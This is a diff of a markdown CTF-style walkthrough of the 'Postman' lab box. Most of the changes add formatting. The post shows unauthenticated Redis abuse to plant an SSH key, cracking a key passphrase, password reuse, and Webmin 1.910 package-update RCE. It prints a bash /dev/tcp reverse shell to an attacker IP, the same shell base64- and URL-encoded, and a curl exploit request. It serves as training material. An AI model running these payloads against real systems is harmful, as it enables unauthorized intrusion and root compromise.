@@ -7,15 +7,15 @@ published: false
 ![](/assets/Postman/Postman.png)
 
 ## Summary
-- Postman is an easy Linux box where we find a misconfigured Redis instance that allows for access without authentication.
-- We exploit that to write our public SSH key into Redis' own `authorized_keys` file which gets us on the machine as the `redis` user.
-- While browsing the file system, we come across a passphrase-protected backup of a private SSH key belonging to a user called `Matt`.
-- Using `ssh2john` and `john`, we're able to crack that key's passphrase. However, using SSH didn't work.
-- Because `Matt` was reusing the password, we used `su` to switch to his user from the shell we had.
-- Trying to escalate our privileges, we found webmin running as `root`. And we also found its version (1.910) vulnerable.
-- The vulnerability could lead to Remote Code Exection if we had valid credentials for a user with access to install package updates.
-- We tested `Matt`'s credentials that we previously found and were able to authenticate successfully. we also had the necessary privileges.
-- We owned the box using both Metasploit and also using `curl` after taking some time to observe and manually recreate the exploit.
+- **Postman** is an easy **Linux** box where we find a **misconfigured Redis instance** that allows for **access without authentication.**
+- We exploit that to **write our public SSH key** into Redis' own `authorized_keys` file which **gets us on the machine** as the `redis` user.
+- *While browsing the file system,* we come across a **passphrase-protected backup** of a **private SSH key** belonging to a user called `Matt`.
+- *Using* `ssh2john` *and* `john`, we're able to **crack that key's passphrase**. *However,* using **SSH didn't work.**
+- *Because* `Matt` *was* ***reusing the password,*** we used `su` to **switch to his user** from the shell we had.
+- *Trying to* ***escalate our privileges,*** we found **Webmin** running as `root`. And also **found its version (1.910) vulnerable.**
+- The vulnerability could lead to **Remote Code Exection** *if* we had **valid credentials** for a user with **access to install package updates.**
+- We tested `Matt`'s credentials that we previously found and were able to **authenticate successfully**. We also had the **necessary privileges.**
+- We owned the box using both **Metasploit** and also using `curl` after **taking some time to observe and manually recreate the exploit.**
 
 ---
 
@@ -37,147 +37,185 @@ PORT      STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The `nmap` shows a standard SSH port as well as HTTP on port 80.
-What's unique here is Redis on port 6379 and Webmin on port 10000.
+The `nmap` scan shows a **standard SSH port** as well as **HTTP on port 80.**
+
+what's **unique** here is **Redis on port 6379** and **Webmin on port 10000.**
 
 ## Testing Redis and Exploiting Misconfiguration for RCE
-Because it can lead to a very quick RCE if not configured with authentication, we try Redis first.
+*Because it can lead to* ***a very quick RCE*** *if not configured with authentication,* we **try Redis first.**
 
-we can connect to it with a simple command:
+we can **connect** to it with a simple command:
 ```bash
 redis-cli -h 10.10.10.160
 ```
 
-Note: you can install the `redis-cli` tool using `apt install redis-tools`
+**Note:** you can **install** the `redis-cli` tool using `apt install redis-tools`
 
-after connecting, we get a prompt. so we run the `info` as a basic command to check if we have access or not.
+*after connecting,* we get a **prompt**. so we run `info` as a **basic command** to **check if we have access or not.**
 
 ![](/assets/Postman/redis-info.jpg)
 
-and we do!
+**and we do!**
 
-This is great because we can now try to write an SSH key to gain access.
+One of the ways to **gain Remote Code Execution** through Redis is explained [here](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh)
 
-This method is explained [here](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh)
+*since* `/var/lib/redis/.ssh` *is the* ***default SSH directory for Redis,*** we will attempt to **add our own public key** to the remote `authorized_keys` file.
 
-since `/var/lib/redis/.ssh` is the default SSH directory for Redis, we will attempt to add our own public key to the remote `authorized_keys` file.
-
-we first generate our key pair using `ssh-keygen`
+we first **generate our own key pair** using `ssh-keygen`
 
 ![](/assets/Postman/ssh-keygen.jpg)
 
-then echo the public key (wrapped around double new lines) into `redis-cli` with the `-x` flag to take input from STDIN
+then **echo the public key** *(wrapped around double new lines)* into `redis-cli` with the `-x` flag to **take input from STDIN**
 
-and proceed with the same steps as described.
+and **proceed with the same steps** as below.
 
 ![](/assets/Postman/redis-adding-the-public-key.jpg)
 
-Note: for a breakdown of what each command does, you can refer to the [official command documentation](https://redis.io/commands/).
+**Note:** *for a breakdown of what each command does,* you can **refer** to the [official documentation](https://redis.io/commands/).
 
-having recieved the expected responses, we go ahead and try connecting with the `redis` user:
+*having recieved the expected responses,* we go ahead and try connecting with the `redis` user:
 
 ![](/assets/Postman/redis-ssh-success.jpg)
 
-we're good to go :D
+**we're good to go :D**
 
 ## Pivoting to Matt
-After getting on the box, and while checking the file system, we visit the `/opt` directory (since it may contain interesting files).
+*After getting on the box, and while checking the file system,* we visit the `/opt` directory *(since it may contain interesting files).*
 
-we have a finding there:
+we **had a finding** there:
 
 ![](/assets/Postman/pivot-finding-matts-backup-key.jpg)
 
-it seems like a passphrase-protected backup of `Matt`'s private SSH key.
+it seems like a **passphrase-protected backup** of `Matt`'s **private SSH key.**
 
-to crack it, we're going to use `ssh2john`
+we're going to use `ssh2john` to **get a hash** then **crack it** with `john` *(himself :P)*.
 
 ![](/assets/Postman/pivot-cracking-matts-key.jpg)
 
-sucessfully cracked! we should be able to SSH now.
+**sucessfully cracked!** we should be able to SSH now.
 
 ![](/assets/Postman/pivot-cant-ssh-as-matt.jpg)
 
-we couldn't. the next we tried was to use `su` from within.
+but we couldn't :/
+
+the next thing we tried was using `su` from within.
 
 ![](/assets/Postman/pivot-su-matt.jpg)
 
-that worked.
+**which worked.**
 
 ## Exploiting Webmin for Privilege Escalation
-From the `nmap` scan, we notice that Webmin's version is 1.910.
+*From the* `nmap` *scan,* we noticed that **Webmin's version is 1.910.**
 
-and, because its process is running as `root`, we know we should check this out:
+*and, because its process is* ***running as*** `root`, we know we should check this out.
 
 ![](/assets/Postman/privesc-webmin-running-as-root.jpg)
 
-when Googling for exploits, we get plenty of results:
+we get **plenty of results** when **Googling for exploits:**
 
 ![](/assets/Postman/privesc-webmin-exploit-search.jpg)
 
-We decide to check the [Exploit-DB version](https://www.exploit-db.com/exploits/46984)
+we decided to check the [Exploit-DB](https://www.exploit-db.com/exploits/46984) one.
 
-being a verified Metasploit Module, we can expect a well-written exploit :)
+*being a* **verified Metasploit Module,** we can expect a **well-written exploit :)**
 
-from its description, this seems like it requires a valid user:
+*from its description,* this seems like it **requires a valid user.**
 
 ![](/assets/Postman/privesc-webmin-exploit-requirements.jpg)
 
-after visiting port 10000 from outside, we redirected to HTTPs and the hostname changes to postman.
+*to* ***check our credentials,*** we **visit port 10000**.
 
-when we try logging in as `Matt` using the same password `computer2008`, we get authenticated.
+we get **redirected to HTTPS** and the **hostname changes to postman.**
+
+*when we try logging in as* `Matt` ***using the same password*** `computer2008`, we **get authenticated.**
+
+***Matt was reusing the password here as well :)***
 
 ![](/assets/Postman/privesc-webmin-logged-in.jpg)
 
-furthermore, we seem to have the needed privilege. we can confirm by clicking the link highlighted above.
+*furthermore,* we seem to **have the needed privilege (to update packages)**. we **confirmed this** by **clicking the link highlighted above.**
 
 ![](/assets/Postman/privesc-webmin-package-privilege.jpg)
 
-### The Quick and Easy Way: Metasploit
-After setting:
+### Exploitation the quick and easy way: Metasploit
+***After setting,***
 - `RHOSTS`
 - `USERNAME` and `PASSWORD`
 - `SSL` to `true`
 - `LHOST` and `LPORT`
 
-we get an easy shell as `root`
+***then running the exploit,***
+
+we get an **easy shell** as `root`
 
 ![](/assets/Postman/privesc-webmin-metasploit.jpg)
 
-### A Bit More Manual
-Looking at the exploit code, we find six functions defined:
-1. `initialize`: sets up the module's information
-2. `peer`: seems to adjust the url based on whether it's http or https to be later used in the `Referer` header
-3. `login`: self-descriptive :) logs in and retrieves the `sid` cookie
-4. `check`: this one too, it's checking if the version is indeed the vulnerable one (1.910) and if our user has the privilege to update packages
-5. `exploit`: this method performs the login action and then calls the the `run_update` method below.
-6. `run_update`: performs a POST request adding both the `sid` cookie and the `Referer` header. It then uses a base64-encoded payload for execution demonstrated below:
+### Going manual with curl
+*Looking at the exploit code,* we find **six functions** defined:
+
+`initialize` **sets up the module's properties.**
+
+![](/assets/Postman/exploit-analysis-init.jpg)
+
+`peer` seems to **adjust the url** based on **whether it's HTTP or HTTPS** to be later used in the `Referer` header.
+
+![](/assets/Postman/exploit-analysis-peer.jpg)
+
+`login` is self-descriptive :) it **logs in** and **retrieves the** `sid` **cookie.**
+
+![](/assets/Postman/exploit-analysis-login.jpg)
+
+`check` is **checking if the version is indeed the vulnerable one** (1.910) and **if our user has the privilege to update packages.**
+
+![](/assets/Postman/exploit-analysis-check.jpg)
+
+`run_update` **sends a POST request** with **both the** `sid` **cookie** and **the** `Referer` **header**.
+
+It then **uses a base64-encoded payload** for execution *(demonstrated later)*.
+
+![](/assets/Postman/exploit-analysis-run-update.jpg)
+
+*and finally,* `exploit` **calls the** `login` **function** followed by `run-update` to **perform the exploitation.**
+
+![](/assets/Postman/exploit-analysis-exploit.jpg)
+
+*to see how the* ***base64-encoded payload works,*** we try a simple `id` command:
 
 ![](/assets/Postman/privesc-webmin-b64-payload.jpg)
 
-we're going to replace that with a bash reverse shell payload:
+we're going to **replace that** with **a bash reverse shell.**
 
 ```bash
 bash -i >& /dev/tcp/10.10.16.9/9000 0>&1
 ```
 
-and then encode it as base64 to be:
+and then **encode it as base64** before placing it within the base payload:
 
 ```bash
 bash -c "{echo,'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ=='}|{base64,-d}|{bash,-i}"
 ```
 
-then finally URL-encoding it to be part of the POST data:
+then finally **URL-encode** all that to be **part of the POST data:**
 
 ```
 bash%20-c%20%22%7Becho%2C%27YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ%3D%3D%27%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22
 ```
 
-to exploit, we're going to first grab our `sid` cookie. (The extension used here is called "Cookie Editor")
+***to access the authenticated page,*** we're also going to **grab** `Matt`'s `sid` **cookie** from the browser. *(The extension used here is called "Cookie Editor")*
 
 ![](/assets/Postman/privesc-webmin-sid-cookie.jpg)
 
 
-then create our own `curl` variant of the exploit:
+and add it to **create our own** `curl` **variant of the exploit:**
+
+- `-k` to **allow insecure connections with SSL**
+- `-s` and `-o /dev/null` to **supress the noisy output**
+- `-b` to add the `sid` cookie
+- `-X POST` to **set the request method**
+- `-d` to **fill out the POST data**
+- `-H` for adding the `Referer` header
+
+*together,* **it should look like this:**
 
 ```bash
 curl -k -s -o /dev/null \
@@ -188,8 +226,8 @@ curl -k -s -o /dev/null \
 https://10.10.10.160:10000/package-updates/update.cgi
 ```
 
-after starting our `netcat` listener, we issue the command and get back a sweet reverse shell:
+*after starting our* `netcat` *listener,* we **issue the command** and get back **a sweet reverse shell.**
 
 ![](/assets/Postman/privesc-webmin-curl.jpg)
 
-Pretty nice :)
+**Pretty nice :)**
